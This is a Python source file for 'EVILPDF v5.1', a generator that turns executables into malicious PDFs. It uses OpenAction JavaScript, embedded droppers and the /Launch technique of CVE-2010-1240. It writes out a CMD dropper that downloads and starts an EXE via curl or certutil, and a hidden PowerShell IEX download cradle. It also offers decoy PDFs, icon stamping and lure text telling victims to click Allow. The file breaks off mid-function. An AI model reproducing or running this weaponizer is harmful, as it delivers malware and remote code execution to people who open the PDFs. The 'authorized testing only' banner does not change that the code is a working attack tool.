#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░██████╗░███████╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╔╝██║░░██║█████╗░░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔═══╝░██║░░██║██╔══╝░░
███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░

EVILPDF v5.1 — ALL-IN-ONE EXE ➜ EVIL PDF GENERATOR + /LAUNCH PoC TOOLKIT

  TECHNIQUE A (v4.x lineage)
    • /OpenAction JavaScript: app.launchURL(url, true) -> new tab
    • exportDataObject({cName, nLaunch: 2}) -> launches the embedded dropper
    • embedded CMD dropper downloads your EXE from your URL and opens it
    • optional direct EXE embed, --icon stamps a .ico into the PE resources
    • optional --batch (your own .cmd) / --js (your own OpenAction JS)

  TECHNIQUE B (CVE-2010-1239 / CVE-2010-1240, "Escape from PDF")
    • EXE embedded under a <stem>.pdf name, exported then /Launch'ed
    • /Launch of an arbitrary local program + args (no embed, no JS)
    • /Launch of a hidden PowerShell download cradle
    • nojs mode: the /Launch IS the OpenAction
    • built-in scanner (--scan) for triaging suspicious PDFs

  SHARED
    • import YOUR OWN PDF as the visible document (--decoy-pdf)
    • custom page text, embedded-file alias, debug object/offset dumps
    • numbered interactive menu where every number is optional (Enter = default)
    • full CLI so it can run headless. 100% Python 3 standard library.

⚠ FOR AUTHORIZED SECURITY TESTING / RED TEAM / AWARENESS USE ONLY ⚠
"""

from __future__ import annotations

import argparse
import hashlib
import os
import re
import struct
import sys
import time
import urllib.request
import zlib

__version__ = "5.1"

# ══════════════════════════════════════════════════════════════════
#  ANSI COLORS
# ══════════════════════════════════════════════════════════════════

class C:
    GREEN    = '\033[92m'
    LGREEN   = '\033[32m'
    YELLOW   = '\033[93m'
    RED      = '\033[91m'
    CYAN     = '\033[96m'
    BLUE     = '\033[94m'
    MAGENTA  = '\033[95m'
    BOLD     = '\033[1m'
    DIM      = '\033[2m'
    RESET    = '\033[0m'
    BG_TITLE = '\033[102m\033[30m'


def init_ansi():
    if sys.platform.startswith('win'):
        os.system('')


def strip_color():
    for attr in ('GREEN', 'LGREEN', 'YELLOW', 'RED', 'CYAN', 'BLUE',
                 'MAGENTA', 'BOLD', 'DIM', 'RESET', 'BG_TITLE'):
        setattr(C, attr, '')


if os.environ.get('NO_COLOR') or os.environ.get('TERM', '').lower() == 'dumb':
    strip_color()


BANNER = f"""{C.LGREEN}{C.BOLD}

███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░██████╗░███████╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔════╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╔╝██║░░██║█████╗░░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔═══╝░██║░░██║██╔══╝░░
███████╗░░╚██╔╝░░██║███████╗  ██║░░░░░██████╔╝██║░░░░░
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═╝░░░░░╚═════╝░╚═╝░░░░░
{C.RESET}
{C.BG_TITLE}{C.BOLD}  E V I L P D F  -  v{__version__}  -  ALL-IN-ONE GENERATOR + SCANNER  {C.RESET}
{C.CYAN}{C.BOLD}
  ╔════════════════════════════════════════════════════════════════╗
  ║ TOOL   : EXE ➜ evil PDF (JS dropper chain AND CVE-2010-1240)   ║
  ║ ON OPEN: new tab ➜ export ➜ /Launch ➜ payload runs             ║
  ║ EXTRA  : decoy PDF / custom text / icon / own batch / own JS   ║
  ║ EXTRA  : local /Launch, PS cradle, nojs, PDF scanner           ║
  ║ USE    : authorized security testing / red team only           ║
  ╚════════════════════════════════════════════════════════════════╝{C.RESET}
"""


# ══════════════════════════════════════════════════════════════════
#  STATUS / DEBUG
# ══════════════════════════════════════════════════════════════════

DEBUG = [False]


def ts():
    return time.strftime("%H:%M:%S")


def status(sym, msg, color=None):
    print(f"  {C.DIM}[{ts()}]{C.RESET} "
          f"{(color or C.GREEN)}{C.BOLD}[{sym}]{C.RESET} {msg}")


def warn(msg):
    print(f"  {C.YELLOW}{C.BOLD}[!]{C.RESET} {msg}")


def err(msg):
    print(f"  {C.RED}{C.BOLD}[✗]{C.RESET} {msg}")


def dbg(msg):
    if DEBUG[0]:
        print(f"  {C.DIM}[debug]{C.RESET} {C.BLUE}{msg}{C.RESET}")


def hr(ch='─', n=64):
    print(f"  {C.DIM}{ch * n}{C.RESET}")


# ══════════════════════════════════════════════════════════════════
#  PDF PRIMITIVES
# ══════════════════════════════════════════════════════════════════

TEXT_SOFT_MIN = 100          # advisory only — never fatal
TEXT_HARD_MAX = 1000         # advisory only — never fatal


def pdfstr(s: str) -> bytes:
    """Encode a Python string as an escaped PDF literal string."""
    out = []
    for ch in s:
        if ch in "()\\":
            out.append("\\" + ch)
        elif ch == "\n":
            out.append("\\n")
        elif ch == "\r":
            out.append("\\r")
        else:
            out.append(ch)
    return ("(" + "".join(out) + ")").encode("latin-1", "replace")


def hexkey(s: str) -> bytes:
    """UTF-16BE hex string, used for /Names keys."""
    return b"<FEFF" + s.encode("utf-16-be").hex().upper().encode() + b">"


def deflate(data: bytes) -> bytes:
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return c.compress(data) + c.flush()


def sanitize_msg(msg: str) -> str:
    """Parentheses inside /P would break cmd's block parsing."""
    return msg.replace("(", "[").replace(")", "]").replace("\r\n", "\n")


def css(s: str) -> str:
    """Escape a string for inside a JavaScript double-quoted literal."""
    return s.replace('\\', '\\\\').replace('"', '\\"')


def url_filename(url, default="update.exe"):
    try:
        path = url.split('?')[0].split('#')[0]
        name = path.rstrip('/').rsplit('/', 1)[-1]
        if name and '.' in name and len(name) < 80:
            return name
    except Exception:
        pass
    return default


def split_win_path(path):
    """Split a Windows path without relying on the host separator."""
    d, _, f = path.rpartition('\\')
    if not f:
        d, _, f = path.rpartition('/')
    return d, f or path


def read_text_file(path):
    with open(path, 'rb') as f:
        raw = f.read()
    for enc in ('utf-8-sig', 'utf-8', 'cp1252', 'latin-1'):
        try:
            return raw.decode(enc), raw
        except UnicodeDecodeError:
            continue
    return raw.decode('latin-1', 'replace'), raw


PROBE_DIRS = [
    "Desktop",
    "My Documents",
    "Documents",
    "Escritorio",
    "Mis Documentos",
    "Downloads",
    "AppData\\Local\\Temp",
]


def build_launch_script(stem: str, message: str) -> str:
    """cmd.exe /P argument that finds the exported <stem>.pdf and runs it.

    Probes every plausible export location, cd's into the first one that
    holds the file, then start's it. The trailing newline block is what the
    /Launch dialog renders in its File: field.
    """
    parts = ["/Q /C", "%HOMEDRIVE%&cd %HOMEPATH%"]
    for d in PROBE_DIRS:
        parts.append(f'&(if exist "{d}\\{stem}.pdf" (cd "{d}"))')
    for env in ("%TEMP%", "%USERPROFILE%\\Downloads", "%APPDATA%\\Local\\Temp"):
        parts.append(f'&(if exist "{env}\\{stem}.pdf" (cd "{env}"))')
    parts.append(f"&(start {stem}.pdf)")

    script = "".join(parts)
    if message:
        script += "\n" * 10 + sanitize_msg(message)
    script += ")"
    return script


# ══════════════════════════════════════════════════════════════════
#  OBJECT COLLECTOR
# ══════════════════════════════════════════════════════════════════

class ObjList:
    """Collects object bodies with deterministic numbering."""

    def __init__(self, start: int = 1):
        self.start = start
        self.items = []

    def add(self, body):
        n = self.start + len(self.items)
        self.items.append(body)
        return n

    def set(self, n: int, body: bytes):
        self.items[n - self.start] = body

    def render(self, root: int, info=None) -> bytes:
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = {}
        for i, body in enumerate(self.items):
            n = self.start + i
            offsets[n] = len(out)
            out += f"{n} 0 obj\n".encode() + body + b"\nendobj\n"

        size = self.start + len(self.items)
        xref_at = len(out)
        out += f"xref\n{self.start} {len(self.items)}\n".encode()
        for i in range(len(self.items)):
            out += f"{offsets[self.start + i]:010d} 00000 n \n".encode()

        trailer = f"<< /Size {size} /Root {root} 0 R"
        if info:
            trailer += f" /Info {info} 0 R"
        trailer += " >>"
        out += f"trailer\n{trailer}\nstartxref\n{xref_at}\n%%EOF\n".encode()
        return bytes(out)


# ══════════════════════════════════════════════════════════════════
#  ICON STAMPER (Win32 resource API via ctypes)
# ══════════════════════════════════════════════════════════════════

def validate_ico(ico_path):
    if not os.path.isfile(ico_path):
        return False, "icon file not found"
    try:
        with open(ico_path, 'rb') as f:
            head = f.read(6)
    except OSError as e:
        return False, str(e)
    if len(head) < 6 or head[0:2] != b'\x00\x00' or head[2:4] != b'\x01\x00':
        return False, "not a valid .ico file (bad ICONDIR header)"
    if int.from_bytes(head[4:6], 'little') == 0:
        return False, ".ico contains no images"
    return True, "ok"


def apply_icon_to_exe(exe_bytes, ico_path):
    """Return EXE bytes with the icon resource replaced (Windows only)."""
    if not sys.platform.startswith('win'):
        raise OSError("icon stamping requires Windows (Win32 resource API)")
    import ctypes
    import tempfile
    from ctypes import wintypes

    if not exe_bytes.startswith(b'MZ'):
        raise ValueError("payload is not a Windows PE executable")

    with open(ico_path, 'rb') as f:
        ico = f.read()
    count = int.from_bytes(ico[4:6], 'little')
    entries = []
    for i in range(count):
        off = 6 + 16 * i
        w, h, cc, res, planes, bits, size = struct.unpack_from('<BBBBHHI', ico, off)
        img_off = int.from_bytes(ico[off + 12:off + 16], 'little')
        data = ico[img_off:img_off + size]
        if len(data) != size or size == 0:
            raise ValueError("corrupt .ico entry #%d" % (i + 1))
        entries.append((struct.pack('<BBBBHHIH', w, h, cc, res, planes,
                                    bits, size, i + 1), data))
    group = struct.pack('<HHH', 0, 1, count) + b''.join(e[0] for e in entries)

    tmpd = tempfile.mkdtemp(prefix='evilpdf_icon_')
    exe_path = os.path.join(tmpd, 'payload.exe')
    with open(exe_path, 'wb') as f:
        f.write(exe_bytes)

    k32 = ctypes.WinDLL('kernel32', use_last_error=True)
    RT_ICON, RT_GROUP_ICON = 3, 14
    LANG_NEUTRAL = 0
    LOAD_LIBRARY_AS_DATAFILE = 0x2

    group_id = 1
    k32.LoadLibraryExW.argtypes = [wintypes.LPCWSTR, wintypes.HANDLE, wintypes.DWORD]
    k32.LoadLibraryExW.restype = wintypes.HMODULE
    h = k32.LoadLibraryExW(exe_path, None, LOAD_LIBRARY_AS_DATAFILE)
    if h:
        found = []
        CBNUM = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HMODULE,
                                   ctypes.c_void_p, ctypes.c_void_p, wintypes.LPARAM)

        def _cb(hmod, lpszType, lpszName, lparam):
            if lpszName and (lpszName >> 16) == 0:
                found.append(lpszName)
            return False

        k32.EnumResourceNamesW.argtypes = [wintypes.HMODULE, ctypes.c_void_p,
                                           CBNUM, wintypes.LPARAM]
        k32.EnumResourceNamesW.restype = wintypes.BOOL
        k32.EnumResourceNamesW(h, ctypes.c_void_p(RT_GROUP_ICON), CBNUM(_cb), 0)
        k32.FreeLibrary.argtypes = [wintypes.HMODULE]
        k32.FreeLibrary(h)
        if found:
            group_id = found[0]
            dbg("existing icon-group id: %d" % group_id)
        else:
            dbg("no existing icon group — creating id 1")

    k32.BeginUpdateResourceW.argtypes = [wintypes.LPCWSTR, wintypes.BOOL]
    k32.BeginUpdateResourceW.restype = wintypes.HANDLE
    hu = k32.BeginUpdateResourceW(exe_path, False)
    if not hu:
        raise OSError("BeginUpdateResource failed (err %d)" % ctypes.get_last_error())

    k32.UpdateResourceW.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                                    ctypes.c_void_p, wintypes.WORD,
                                    ctypes.c_void_p, wintypes.DWORD]
    k32.UpdateResourceW.restype = wintypes.BOOL
    ok = True
    for idx, (_e, data) in enumerate(entries, start=1):
        if not k32.UpdateResourceW(hu, ctypes.c_void_p(RT_ICON),
                                   ctypes.c_void_p(idx), LANG_NEUTRAL,
                                   data, len(data)):
            ok = False
    if not k32.UpdateResourceW(hu, ctypes.c_void_p(RT_GROUP_ICON),
                               ctypes.c_void_p(group_id), LANG_NEUTRAL,
                               group, len(group)):
        ok = False

    k32.EndUpdateResourceW.argtypes = [wintypes.HANDLE, wintypes.BOOL]
    k32.EndUpdateResourceW.restype = wintypes.BOOL
    if not k32.EndUpdateResourceW(hu, False) or not ok:
        raise OSError("icon stamp failed (err %d)" % ctypes.get_last_error())

    with open(exe_path, 'rb') as f:
        new_bytes = f.read()
    try:
        os.remove(exe_path)
        os.rmdir(tmpd)
    except OSError:
        pass

    if not new_bytes.startswith(b'MZ') or len(new_bytes) < len(exe_bytes):
        raise ValueError("icon stamp corrupted the EXE — keeping original")
    return new_bytes


# ══════════════════════════════════════════════════════════════════
#  THE FORGE
# ══════════════════════════════════════════════════════════════════

NEEDS_URL = ("url", "cmd", "js", "batch")     # always require a payload URL
NEEDS_EXE = ("exe", "embed")                  # require URL *or* --exe
EMBEDDING = ("cmd", "js", "exe", "batch", "embed")


class PDFForge:
    def __init__(self, mode="cmd", exe_url="", out_name="", save_path=".",
                 exe_file=None, decoy_pdf=None, custom_text=None, alias=None,
                 icon=None, batch_file=None, js_file=None, local_path="",
                 local_args="", script_url="", message="", title="Document"):
        self.mode = mode
        self.exe_url = (exe_url or "").strip()
        self.out_name = (out_name or "").strip()
        self.save_path = save_path
        self.exe_file = exe_file
        self.decoy_pdf = decoy_pdf
        self.custom_text = custom_text
        self.alias = alias
        self.icon = icon
        self.batch_file = batch_file
        self.js_file = js_file
        self.local_path = local_path
        self.local_args = local_args
        self.script_url = script_url
        self.message = message
        self.title = title

        self.payload = None
        self.embed_name = ""
        self.stem = ""
        self.output_file = ""
        self.icon_applied = False
        self.js_src = ""

    # ── validation ────────────────────────────────────────────
    def prepare(self):
        status("⚙", "Validating inputs...")

        needs_url = self.mode in NEEDS_URL or (self.mode in NEEDS_EXE and not self.exe_file)
        if needs_url:
            if not self.exe_url:
                err("payload URL is empty!")
                return False
            if not self.exe_url.startswith(("http://", "https://")):
                err(f"invalid URL: {self.exe_url}")
                return False

        if self.mode == "download" and not self.script_url:
            err("download mode needs --url pointing at your script!")
            return False

        if not self.out_name:
            err("output PDF name is empty!")
            return False
        if any(ch in self.out_name for ch in '\\/:*?"<>|'):
            err(f"invalid PDF name: {self.out_name}")
            return False

        self.save_path = os.path.abspath(os.path.expanduser(self.save_path.strip() or "."))
        if not os.path.isdir(self.save_path):
            try:
                os.makedirs(self.save_path, exist_ok=True)
                status("✓", f"created output dir: {C.CYAN}{self.save_path}{C.RESET}")
            except OSError as e:
                err(f"cannot create dir: {e}")
                return False

        if not self.out_name.lower().endswith('.pdf'):
            self.out_name += '.pdf'
        self.output_file = os.path.join(self.save_path, self.out_name)

        if self.mode == "embed":
            status("✓", "launch technique: export + /Launch (CVE-2010-1240)")

        # ── decoy ──
        if self.decoy_pdf:
            self.decoy_pdf = os.path.abspath(os.path.expanduser(self.decoy_pdf))
            if not os.path.isfile(self.decoy_pdf):
                err(f"decoy PDF not found: {self.decoy_pdf}")
                return False
            with open(self.decoy_pdf, 'rb') as f:
                if not f.read(8).startswith(b'%PDF-'):
                    err("decoy file is not a valid PDF!")
                    return False
            status("✓", f"decoy PDF ready : {C.CYAN}{self.decoy_pdf}{C.RESET} "
                        f"({C.YELLOW}{os.path.getsize(self.decoy_pdf):,}{C.RESET} bytes)")
            if self.custom_text:
                warn("page text is ignored in decoy mode (the decoy supplies the page)")

        # ── page text (soft limits only) ──
        if self.custom_text and not self.decoy_pdf:
            n = len(self.custom_text)
            if n > TEXT_HARD_MAX:
                warn(f"page text is {n} chars — only the first {TEXT_HARD_MAX} "
                     f"will be used")
                self.custom_text = self.custom_text[:TEXT_HARD_MAX]
            elif n < TEXT_SOFT_MIN:
                warn(f"page text is only {n} chars — the page will look sparse")
            status("✓", f"page text       : {C.YELLOW}{len(self.custom_text)}{C.RESET} chars")

        # ── payload file ──
        if self.mode in NEEDS_EXE and self.exe_file:
            self.exe_file = os.path.abspath(os.path.expanduser(self.exe_file))
            if not os.path.isfile(self.exe_file):
                err(f"EXE not found: {self.exe_file}")
                return False
            status("✓", f"EXE file        : {C.CYAN}{self.exe_file}{C.RESET} "
                        f"({C.YELLOW}{os.path.getsize(self.exe_file):,}{C.RESET} bytes)")

        # ── icon ──
        if self.icon:
            self.icon = os.path.abspath(os.path.expanduser(self.icon))
            ok, why = validate_ico(self.icon)
            if not ok:
                err(f"invalid icon file '{self.icon}': {why}")
                return False
            if self.mode not in NEEDS_EXE:
                warn(f"icon ignored in '{self.mode}' mode (only direct EXE embeds)")
                self.icon = None
            else:
                status("✓", f"icon file OK    : {C.CYAN}{self.icon}{C.RESET}")

        # ── own batch ──
        if self.mode == "batch":
            if not self.batch_file:
                err("batch mode needs a batch file path!")
                return False
            self.batch_file = os.path.abspath(os.path.expanduser(self.batch_file))
            if not os.path.isfile(self.batch_file):
                err(f"batch file not found: {self.batch_file}")
                return False
            body, raw = read_text_file(self.batch_file)
            if not body.strip():
                err("batch file is empty!")
                return False
            status("✓", f"batch file OK   : {C.CYAN}{self.batch_file}{C.RESET} "
                        f"({C.YELLOW}{len(raw):,}{C.RESET} bytes)")
            if not re.search(r'(?im)^\s*@?echo', body):
                warn("batch file has no @echo off — the victim sees the trace")

        # ── own JS ──
        if self.mode == "js":
            if not self.js_file:
                err("js mode needs a JavaScript file path!")
                return False
            self.js_file = os.path.abspath(os.path.expanduser(self.js_file))
            if not os.path.isfile(self.js_file):
                err(f"JS file not found: {self.js_file}")
                return False
            self.js_src, _ = read_text_file(self.js_file)
            if not self.js_src.strip():
                err("JS file is empty!")
                return False
            status("✓", f"JS file OK      : {C.CYAN}{self.js_file}{C.RESET} "
                        f"({C.YELLOW}{len(self.js_src):,}{C.RESET} chars)")
            if "exportDataObject" not in self.js_src:
                warn("JS has no exportDataObject() — the dropper will not auto-launch")

        # ── local program ──
        if self.mode == "local":
            if not self.local_path:
                self.local_path = r"C:\Windows\System32\calc.exe"
            status("✓", f"local program   : {C.CYAN}{self.local_path}{C.RESET}")

        if self.mode == "download":
            status("✓", f"cradle URL      : {C.CYAN}{self.script_url}{C.RESET}")

        # ── resolve embedded name ──
        auto = url_filename(self.exe_url) if self.exe_url else "update.exe"
        if self.mode == "exe":
            name = (self.alias or auto)
            if not name.lower().endswith('.exe'):
                name += '.exe'
        elif self.mode in ("embed", "nojs"):
            self.stem = re.sub(r"[^A-Za-z0-9_.-]", "_", (self.alias or "invoice")) or "invoice"
            if self.stem.lower().endswith('.pdf'):
                self.stem = self.stem[:-4]
            name = f"{self.stem}.pdf" if self.mode == "embed" else ""
        elif self.mode == "batch":
            name = (self.alias or os.path.basename(self.batch_file) or "update.cmd")
            if name.lower().endswith('.txt'):
                name = name[:-4]
            if not name.lower().endswith(('.cmd', '.bat')):
                name += '.cmd'
        else:  # cmd / js
            name = (self.alias or "update.cmd")
            if not name.lower().endswith(('.cmd', '.bat')):
                name += '.cmd'

        self.embed_name = name
        if name:
            status("✓", f"embedded file   : {C.CYAN}{name}{C.RESET}")
        if self.exe_url:
            status("✓", f"detected EXE name: {C.CYAN}{auto}{C.RESET}")
        status("✓", f"target output   : {C.CYAN}{self.output_file}{C.RESET}")
        return True

    # ── payload loading ───────────────────────────────────────
    def load_payload(self):
        if self.mode == "batch":
            _b, raw = read_text_file(self.batch_file)
            raw = raw.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
            raw = raw.replace(b'\n', b'\r\n')
            if raw and not raw.endswith(b'\r\n'):
                raw += b'\r\n'
            self.payload = raw
            return True

        if self.mode in ("cmd", "js"):
            self.payload = self.build_dropper()
            return True

        if self.mode in NEEDS_EXE:
            if self.exe_file:
                with open(self.exe_file, 'rb') as f:
                    self.payload = f.read()
                if not self.payload.startswith(b'MZ'):
                    warn("payload has no MZ header — not a Windows PE")
            else:
                if not self.download_exe():
                    return False
            if self.icon:
                self.stamp_icon()
            return True

        self.payload = None
        return True

    def download_exe(self):
        try:
            status("⬇", f"fetching payload: {C.CYAN}{self.exe_url}{C.RESET}")
            req = urllib.request.Request(
                self.exe_url,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            t0 = time.time()
            with urllib.request.urlopen(req, timeout=30) as resp:
                self.payload = resp.read()
            if len(self.payload) < 64:
                warn(f"payload very small ({len(self.payload)} bytes)")
            if not self.payload.startswith(b'MZ'):
                warn("downloaded payload has no MZ header")
            status("✓", f"payload OK: {C.YELLOW}{len(self.payload):,}{C.RESET} bytes "
                        f"in {time.time() - t0:.2f}s")
            return True
        except Exception as e:
            err(f"error fetching EXE: {e}")
            return False

    def stamp_icon(self):
        if not self.icon or self.payload is None:
            return
        if not sys.platform.startswith('win'):
            warn("icon NOT applied: stamping needs Windows (on %s)" % sys.platform)
            return
        try:
            status("⚙", f"stamping icon into EXE: {C.CYAN}{self.icon}{C.RESET} ...")
            self.payload = apply_icon_to_exe(self.payload, self.icon)
            self.icon_applied = True
            status("✓", f"icon applied! EXE is now "
                        f"{C.YELLOW}{len(self.payload):,}{C.RESET} bytes")
        except Exception as e:
            warn(f"icon stamp failed ({e}) — keeping the original icon")

    # ── CMD dropper ───────────────────────────────────────────
    def build_dropper(self):
        auto = url_filename(self.exe_url)
        return (
            "@echo off\r\n"
            "setlocal\r\n"
            f'set "EXEURL={self.exe_url}"\r\n'
            f'set "EXENAME={auto}"\r\n'
            'set "EXEDIR=%TEMP%\\evilpdf"\r\n'
            'if not exist "%EXEDIR%" mkdir "%EXEDIR%"\r\n'
            'cd /d "%EXEDIR%"\r\n'
            'where curl >nul 2>nul\r\n'
            'if %errorlevel%==0 (\r\n'
            '    curl -s -L -o "%EXENAME%" "%EXEURL%"\r\n'
            ') else (\r\n'
            '    certutil -urlcache -split -f "%EXEURL%" "%EXENAME%" >nul 2>nul\r\n'
            ')\r\n'
            'if exist "%EXENAME%" (\r\n'
            '    start "" "%EXENAME%"\r\n'
            ')\r\n'
            "endlocal\r\n"
        ).encode('utf-8')

    # ── action objects ────────────────────────────────────────
    def _js(self, ol, body: str, nxt=None):
        obj = b"<< /Type /Action /S /JavaScript /JS " + pdfstr(body)
        if nxt:
            obj += b" /Next " + nxt
        return ol.add(obj + b" >>")

    def _launch(self, ol, fname: str, args: str, cwd: str = r"c:\windows\system32"):
        body = (b"<< /Type /Action /S /Launch /Win << /F " + pdfstr(fname)
                + b" /D " + pdfstr(cwd))
        if args:
            body += b" /P " + pdfstr(args)
        return ol.add(body + b" >> >>")

    def build_action(self, ol):
        """Add the OpenAction graph, return the reference bytes or None."""
        if self.mode == "url":
            js = f'try {{ app.launchURL("{css(self.exe_url)}", true); }} catch(e) {{}}'
            return b"%d 0 R" % self._js(ol, js)

        if self.mode in ("cmd", "js", "exe", "batch"):
            if self.mode == "js":
                js = self.js_src
            else:
                lines = ['try {']
                if self.exe_url:
                    lines.append('  try { app.launchURL("%s", true); } catch(e0) {}'
                                 % css(self.exe_url))
                lines.append('  try {')
                lines.append('    this.exportDataObject({cName: "%s", nLaunch: 2});'
                             % css(self.embed_name))
                lines.append('  } catch(e1) {')
                if self.exe_url:
                    lines.append('    try { this.getURL("%s"); } catch(e2) {}'
                                 % css(self.exe_url))
                lines.append('  }')
                lines.append('} catch(outer) {')
                if self.exe_url:
                    lines.append('  try { app.launchURL("%s", true); } catch(u) {}'
                                 % css(self.exe_url))
                lines.append('}')
                js = "\n".join(lines)
            dbg("JS payload:\n" + js)
            return b"%d 0 R" % self._js(ol, js)

        if self.mode == "embed":
            launch = self._launch(ol, "cmd.exe",
                                  build_launch_script(self.stem, self.message))
            js = 'this.exportDataObject({ cName: "%s", nLaunch: 0 });' % self.stem
            return b"%d 0 R" % self._js(ol, js, b"%d 0 R" % launch)

        if self.mode == "nojs":
            return b"%d 0 R" % self._launch(ol, "cmd.exe",
                                           build_launch_script(self.stem, self.message))

        if self.mode == "local":
            d, f = split_win_path(self.local_path)
            args = self.local_args
            if self.message:
                args = (args + "\n" * 10 + sanitize_msg(self.message)).strip("\n")
            return b"%d 0 R" % self._launch(ol, f, args,
                                           d or r"c:\windows\system32")

        if self.mode == "download":
            cradle = ('powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
                      '"IEX(New-Object Net.WebClient).DownloadString(\'%s\')"'
                      % self.script_url)
            script = "/Q /C " + cradle
            if self.message:
                script += "\n" * 10 + sanitize_msg(self.message)
            script += ")"
            return b"%d 0 R" % self._launch(ol, "cmd.exe", script)

        return None

    # ── embedded file graph ───────────────────────────────────
    def add_embedded(self, ol):
        comp = deflate(self.payload)
        ck = hashlib.md5(comp).hexdigest().upper().encode()
        stream = ol.add(
            b"<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream "
            b"/Length %d /Filter /FlateDecode /DL %d "
            b"/Params << /Size %d /CheckSum <%s> >> >>\nstream\n"
            % (len(comp), len(self.payload), len(self.payload), ck)
            + comp + b"\nendstream")
        desc = url_filename(self.exe_url) if self.exe_url else ""
        fs = ol.add(b"<< /Type /Filespec /UF " + pdfstr(self.embed_name)
                    + b" /F " + pdfstr(self.embed_name)
                    + (b" /Desc " + pdfstr(desc) if desc else b"")
                    + b" /EF << /F %d 0 R >> >>" % stream)
        key = self.stem or self.embed_name
        names = ol.add(b"<< /Names [ " + hexkey(key) + b" " + b"%d 0 R" % fs + b" ] >>")
        return names

    # ── page content ──────────────────────────────────────────
    def build_page_content(self):
        if self.custom_text:
            lines = self.custom_text.split("\n")
        else:
            lines = ["Document",
                     "",
                     "Please wait while the document loads...",
                     "A security warning may appear if you open this file",
                     "outside of a trusted location. Click Allow to continue."]
        ops, y = [], 712
        for i, ln in enumerate(lines[:39]):
            text = ln.rstrip()
            if text and i == 0:
                ops.append("BT /F1 18 Tf 72 %d Td %s Tj ET"
                           % (y, pdfstr(text).decode('latin-1')))
                y -= 30
            elif text:
                ops.append("BT /F2 12 Tf 72 %d Td %s Tj ET"
                           % (y, pdfstr(text).decode('latin-1')))
                y -= 18
            else:
                y -= 18
        return ("\n".join(ops) + "\n").encode('latin-1', 'replace')

    # ── build: from scratch ───────────────────────────────────
    def build_scratch(self):
        ol = ObjList(1)
        cat = ol.add(None)
        ol.add(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        page = ol.add(None)
        contents = ol.add(None)
        f1 = ol.add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>")
        f2 = ol.add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

        pc = self.build_page_content()
        ol.set(contents, b"<< /Length %d >>\nstream\n" % len(pc) + pc + b"endstream")
        ol.set(page, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                     b"/Resources << /Font << /F1 %d 0 R /F2 %d 0 R >> >> "
                     b"/Contents %d 0 R >>" % (f1, f2, contents))

        names = self.add_embedded(ol) if self.payload is not None else None
        openaction = self.build_action(ol)
        info = ol.add(b"<< /Title " + pdfstr(self.title)
                      + b" /Producer " + pdfstr("EVILPDF %s" % __version__) + b" >>")

        catalog = b"<< /Type /Catalog /Pages 2 0 R"
        if openaction:
            catalog += b" /OpenAction " + openaction
        if names:
            catalog += (b" /Names << /EmbeddedFiles " + b"%d 0 R" % names
                        + b" >> /PageMode /UseAttachments")
        catalog += b" >>"
        ol.set(cat, catalog)

        data = ol.render(root=cat, info=info)
        rows = [(cat, "Catalog", 0), (info, "Info", 0)]
        return data, rows

    # ── build: import a decoy PDF ─────────────────────────────
    def build_with_decoy(self):
        with open(self.decoy_pdf, 'rb') as f:
            raw = f.read()

        nums = [int(n) for n in re.findall(rb'(\d+)\s+0\s+obj\b', raw)]
        if not nums:
            raise ValueError("no objects found in decoy PDF")
        base = max(nums)
        sm = re.search(rb'startxref\s+(\d+)', raw[-4096:])
        if not sm:
            raise ValueError("no startxref in decoy PDF")
        old_xref = int(sm.group(1))
        tr = re.search(rb'/Root\s+(\d+)\s+0\s+R', raw)
        if not tr:
            raise ValueError("no /Root in decoy trailer")
        root_num = int(tr.group(1))
        root_body = b''
        for m in re.finditer(rb'(\d+)\s+0\s+obj(.*?)endobj', raw, re.S):
            if int(m.group(1)) == root_num:
                root_body = m.group(2)
                break
        pm = re.search(rb'/Pages\s+(\d+)\s+0\s+R', root_body)
        if not pm:
            raise ValueError("decoy root has no /Pages — cannot import")
        pages_ref = b"%d 0 R" % int(pm.group(1))
        dbg(f"decoy max_obj={base} old_xref=@{old_xref} root={root_num}")

        ol = ObjList(base + 1)
        cat = ol.add(None)
        names = self.add_embedded(ol) if self.payload is not None else None
        openaction = self.build_action(ol)

        catalog = b"<< /Type /Catalog /Pages " + pages_ref
        if openaction:
            catalog += b" /OpenAction " + openaction
        if names:
            catalog += (b" /Names << /EmbeddedFiles " + b"%d 0 R" % names
                        + b" >> /PageMode /UseAttachments")
        catalog += b" >>"
        ol.set(cat, catalog)

        out = bytearray(raw)
        if not out.endswith(b"\n"):
            out += b"\n"
        offsets = {}
        for i, body in enumerate(ol.items):
            n = ol.start + i
            offsets[n] = len(out)
            out += f"{n} 0 obj\n".encode() + body + b"\nendobj\n"

        xref_off = len(out)
        out += f"xref\n{ol.start} {len(ol.items)}\n".encode()
        for i in range(len(ol.items)):
            out += f"{offsets[ol.start + i]:010d} 00000 n \n".encode()
        out += (f"trailer\n<< /Size {ol.start + len(ol.items)} /Root {cat} 0 R "
                f"/Prev {old_xref} >>\nstartxref\n{xref_off}\n%%EOF\n").encode()
        return bytes(out), [(n, "obj", o) for n, o in offsets.items()]

    # ── main ──────────────────────────────────────────────────
    def generate(self):
        if not self.prepare():
            return False
        if not self.load_payload():
            return False

        try:
